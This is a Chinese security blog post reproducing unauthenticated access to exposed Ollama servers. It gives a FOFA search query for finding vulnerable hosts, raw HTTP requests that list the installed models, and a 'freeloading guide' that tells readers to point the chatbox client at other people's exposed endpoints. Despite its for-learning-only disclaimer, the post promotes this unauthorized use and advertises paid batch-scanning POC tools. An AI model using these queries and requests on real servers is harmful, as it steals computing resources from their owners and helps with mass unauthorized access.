#  Ollama未授权访问，白嫖AI服务 附POC   
2025-3-4更新  南风漏洞复现文库   2025-03-04 23:55  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Ollama未授权访简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
## 2.漏洞描述  
  
Ollama未授权访问  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
![Ollama未授权访问](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIJyQplb1smDCNJJRtrKLdOfOhwKGNRZC77iahxM1BCf7kLWauKFWAhmw/640?wx_fmt=png&from=appmsg "null")  
  
Ollama未授权访问  
## 4.fofa查询语句  
  
app="Ollama" && is_domain=false  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx:11434/  
  
漏洞数据包：  
```
GET / HTTP/1.1
Host: xx.xx.xx.xx11434
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIcGIjEibZRlfOStVKo9XPc6EaR1N653Km3RFiaeGBOApFZznb2j0bhomA/640?wx_fmt=jpeg&from=appmsg "null")  
```
GET /api/tags HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx:11434


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfI1icG9OpUZX18GldBeQevSNfXAD3nUCMuog2R5cSJicpnQnVoyzBr9oyw/640?wx_fmt=jpeg&from=appmsg "null")  
  
正式因为这个漏洞，让我这种懒人、穷人有了白嫖ai服务的机会。 近期一直用AI写代码，效果已经不错了，特别是对于全栈工程师来说，基本一个人微调一下代码就能搞定一个项目， 大家还是要尽快拥抱AI，提升工作和学习效率。  
  
白嫖攻略  
  
下载chatbox，把上面的未授权接口填进去就能用了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIQeu7ZFYjibZfrUP4SHBZEz4WrZwp2q9HPNR0J6lSw57VAW3Cibq3J2Ig/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIr2WR2J3LMSYcXreEEUXZJuBhrWOMInHJvN3hqfEhiboJKrmic5km9sew/640?wx_fmt=jpeg&from=appmsg "")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIBaf8nHkRcr6h1ZeN7TTzI97kCh18V3wLV7qEnxuTcBY5sWicR0hAJSQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIxPub6hlAYVcAw2BWy6RI3kalUzp6GXibd4MCL53MrdndTQGF3svjPFA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIUicbrYX4ZAO14KgW4ibiayVkaK02cAOHFDssiarUs475Lo5jL6eWNWvQibQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIGHbHgVpcxhRVOoO7ZJtT1XasUH6qgpGQjhVK6VYADG71aDwPBjVhlw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZspIzh2ku9KlXiacyzKRxfIqicruChbzwFMdvqRzaY35zyI1GNw2rlLLQeelF0XOCpjqSU2YVoibS6A/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
加入访问权限  
## 8.往期回顾  
  
  
  
